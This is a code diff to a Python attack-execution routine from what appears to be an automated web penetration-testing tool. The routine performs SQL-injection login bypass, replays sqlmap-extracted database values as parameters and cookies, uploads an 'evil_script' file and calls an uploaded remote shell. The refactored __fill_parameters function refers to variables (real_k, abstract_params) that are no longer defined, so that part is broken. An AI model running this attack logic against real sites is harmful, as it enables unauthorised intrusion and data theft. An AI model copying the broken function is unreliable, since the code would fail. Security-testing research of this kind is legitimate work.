@@ -72,7 +72,7 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
          concretization_data = json.load(data_file)
          data_file.close()
     concretization_domain = concretization_data["domain"]
-    
+
     __got_cookie = False
 
     # loop the msc_table, the main execution loop
@@ -132,7 +132,7 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
             req["url"] = concretization_details["url"]
             req["method"] = concretization_details["method"]
             req["params"]=concrete_params
-            
+
             # now create the params
             # req_params = {}
             # if "params" in concretization_details:
@@ -265,8 +265,9 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                 # authentication bypass
                 logger.info("Perform authentication bypass attack!")
 
-                pages = msc_table[idx+1][1][2].split(",")
-                check = concretization_data[pages[0]]
+                page = msc_table[idx+1][1][2].split(",")
+                check = concretization_data[page[0]]
+                print(req)
                 is_bypassed = sqli.execute_bypass(s,req,check)
                 if is_bypassed:
                     logger.info("bypass succeeded")
@@ -329,15 +330,11 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                 table = concretization_details["tables"]
                 permutation_params = __product(abstract_params, concrete_params, mapping, table, sqlmap_output)
                 permutation_cookies = __product(abstract_cookies, concrete_cookies, mapping, table, sqlmap_output)
-                print(permutation_params)
                 permutation_params = []
                 found = False
                 # loop on all the possibile params and cookies combination and try to exploit the result
                 if len(permutation_params) == 0 and len(permutation_cookies) > 0:
                     # we only have cookies
-                    print(" #### ")
-                    print(len(permutation_cookies[0]))
-                    print(" #### ")
                     for row in permutation_cookies:
                         for c in row:
                             if not found:
@@ -345,7 +342,7 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                                 logger.debug(debugMsg)
                                 print(c)
 
-                                req["cookies"] = c 
+                                req["cookies"] = c
                                 # req["cookies"] = dict( item.split("=") for item in header.split("%26") )
                                 __fill_parameters(abstract_params, concrete_params, req)
                                 response = execute_request(s,req)
@@ -353,137 +350,6 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                 if not found:
                     logger.error("Exploitation failed, none of the tested parameters wored, aborting!")
                     exit(0)
-
-                # # generate all possible combination of parameters
-                # try:
-                #     concretization_params = concretization_data[tag]["params"]
-                #     req_params = []
-                #     for k,v in concretization_params.items():
-                #         tmp = v.split("=")
-                #         pair = []
-                #         if tmp[1] == "?":
-                #            # we need to provide something from the output of sqlmap
-                #            concrete_table = None
-                #            try:
-                #                concrete_table = concretization_data[tag]["tables"][tmp[0]].split(".")
-                #            except KeyError:
-                #                logger.critical("couldn't find table details in the concretization file")
-                #                exit(0)
-                #            extracted_values = sqlmap_data[concrete_table[0]][concrete_table[1]]
-                #            for v in extracted_values:
-                #                pair.append(tmp[0]+"="+v)
-                #            req_params.append(pair)
-                #         else:
-                #             pair.append(tmp[0] + "=" + tmp[1])
-                #             req_params.append(pair)
-                #     debugMsg = "req_params: {}".format(req_params)
-                #     logger.debug(debugMsg)
-                # except KeyError:
-                #     logger.warning("no parameters defined in the concretization file")
-
-                # # generate all possible combination of cookies
-                # req_cookies = []
-
-                # abstract_cookie_to_table = {}
-                # tables = concretization_data[tag]["tables"]
-                # print(params)
-                # print(cookies)
-            
-
-               ##  if "cookies" in concretization_data[tag]:
-               ##      cookies = concretization_data[tag]["cookies"]
-               ##      print(cookies)
-               ##      for cookie in cookies:
-               ##          print(cookie)
-               ##          for c_k, c_v in cookies[cookie].items():
-               ##              if "?" in c_v:
-               ##                  # provide value from database
-
-               ##              abstract_cookie_to_table[c_k] = tables[c_k]
-               ##              
-               ##      print(abstract_cookie_to_table)
-               ##      for cookie in cookies:
-                #         
-                #         
-                # try:
-                #     concretization_cookies = concretization_data[tag]["cookies"]
-                #     req_cookies = []
-                #     for k,v in concretization_cookies.items():
-                #         print(v)
-                #         tmp = v.split("=")
-                #         pair = []
-                #         if tmp[1] == "?":
-                #            # we need to provide something from sqlmap output
-                #            concrete_table = None
-                #            try:
-                #                concrete_table = concretization_data[tag]["tables"][tmp[0]].split(".")
-                #            except KeyError:
-                #                logger.debug("coldn't find table details in the concretization file")
-                #                exit(0)
-                #            extracted_values = sqlmap_data[concrete_table[0]][concrete_table[1]]
-                #            for v in extracted_values:
-                #                pair.append(tmp[0]+"="+v)
-                #            req_cookies.append(pair)
-                #         else:
-                #             pair.append(tmp[0] + "=" + tmp[1])
-                #             req_cookies.append(pair)
-                #     debugMsg = "req_cookies: {}".format(req_cookies)
-                #     logger.debug(debugMsg)
-                # except KeyError:
-                #     logger.warning("no cookies defined in the concretization file")
-                # # I used the %26 (encode of &) because it might happen that the password has a &
-                # # and when I split, I split wrong
-                # params_perm = []
-                # cookies_perm = []
-                # if len(req_params) > 0:
-                #     params_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_params)]
-                # if len(req_cookies) > 0:
-                #     cookies_perm = ["%26".join(str(y) for y in x) for x in itertools.product(*req_cookies)]
-                # debugMsg = "params perm: {}".format(params_perm)
-                # logger.debug(debugMsg)
-                # debugMsg = "cookies perm: {}".format(cookies_perm)
-                # logger.debug(debugMsg)
-
-                # found = False
-                # # loop on all the possibile params and cookies combination and try to exploit the result
-                # if len(params_perm) == 0 and len(cookies_perm) > 0:
-                #     # we only have cookies
-                #     for header in cookies_perm:
-                #         if not found:
-                #             debugMsg = "Attempt to exploit sqli: {}".format(header)
-                #             logger.debug(debugMsg)
-                #             req["cookies"] = dict( item.split("=") for item in header.split("%26") )
-                #             __fill_parameters(abstract_params,concrete_params,req)
-                #             response = execute_request(s,req)
-                #             found = __check_response(idx,msc_table,concretization_data,response)
-                # elif len(params_perm) > 0 and len(cookies_perm) == 0:
-                #     # we only have params
-                #     for param in params_perm:
-                #         if not found:
-                #             debugMsg = "Attempt to exploit sqli: {}".format(param)
-                #             logger.debug(debugMsg)
-                #             req["params"] = dict( item.split("=") for item in param.split("%26") )
-                #             __fill_parameters(abstract_params,concrete_params,req)
-                #             response = execute_request(s,req)
-                #             found = __check_response(idx,msc_table,concretization_data,response)
-                # elif len(params_perm) > 0 and len(cookies_perm) > 0:
-                #     # we have params and cookies values
-                #     for param in params_perm:
-                #         req["params"] = dict( item.split("=") for item in param.split("%26") )
-                #         for header in cookies_perm:
-                #             if not found:
-                #                 debugMsg = "Attempt to exploit sqli: {}".format(param)
-                #                 logger.debug(debugMsg)
-                #                 req["cookies"] = dict( item.split("=") for item in header.split("%26") )
-                #                 __fill_parameters(abstract_params,concrete_params,req)
-                #                 response = execute_request(s,req)
-                #                 found = __check_response(idx,msc_table,concretization_data,response)
-
-                # if not found:
-                #     # we couldn't procede in the trace, abort
-                #     logger.warning("Exploitation failed, abort trace execution")
-                #     exit(0)
-                # logger.info("Exploitation succceded")
                 continue
 
             # exploit a file upload
@@ -496,12 +362,13 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                 abstract_k = list(abstract_params)[0]
                 abstract_v = abstract_params[abstract_k]
                 if "evil_file" in abstract_v:
-
                     # retrieve the real key
-                    real_k = list(concrete_params[abstract_k])[0]
+                    real_k = mapping[abstract_k]
+                    # remove real_k from the parameters list, to avoind
+                    # __fili_parameters to ask a value for it
+                    del(req["params"][real_k])
                     req["files"] = { real_k : ("evil_script",config.EVIL_SCRIPT) }
-
-                __fill_parameters(abstract_params,concrete_params,req)
+                __fill_parameters(abstract_params,concrete_params, mapping, req)
                 response = execute_request(s,req)
 
             # exploit filesystem attacks
@@ -525,7 +392,10 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
 
 
             if attack == 9:
+                #TODO: it would be nice to implement a scraper that scrapes the
+                # web app and try to find where the file has been uploaded
                 logger.info("Exploiting remote shell!")
+                logger.warning("Feature not completely implemented")
 
                 debugMsg = "We are exploiting a remote shell for file reading {}".format(message)
                 logger.debug(debugMsg)
@@ -537,7 +407,7 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
                         url_evil_file = input("URL of the remote evil script:\n")
                     req["url"] = url_evil_file
 
-                __fill_parameters(abstract_params,concrete_params,req)
+                __fill_parameters(abstract_params, concrete_params, mapping, req)
                 # perform a request to url_evil_file
                 response = execute_request(s,req)
                 url = req["url"]
@@ -575,16 +445,19 @@ def execute_attack(msc_table,msc_table_info,file_aslanpp):
     # end loop over the msc
     logger.info("Execution of the AAT ended!")
 
-def __fill_parameters(abstract_params,concrete_params,req):
+def __fill_parameters(abstract, init, mapping, req):
     # if we have a ? in the params, ask the user to provide a value
     # for that parameter. Show the abstract value for better decision
     # making
-    for abstract_k in abstract_params:
-        real_mapping = concrete_params[abstract_k]
-        for real_k in real_mapping:
-            if real_mapping[real_k] == "?":
-                real_v = input("provide value for parameter {} (abstract value {})\n".format(real_k,abstract_params[abstract_k]))
-                req["params"][real_k] = real_v
+    inverse_mapping = dict(zip(mapping.values(), mapping.keys()))
+    for real_p in init:
+        if real_p in inverse_mapping:
+            ab_k = inverse_mapping[real_p]
+            if "?" in abstract[ab_k]:
+                # provide value for that parameter
+                val = input("provide value for parameter {} (abstract value {})\n".format(real_k,abstract_params[abstract_k]))
+                req["params"][real_k] = val
+
 
 def __ask_file_to_show(files):
     selection = ""
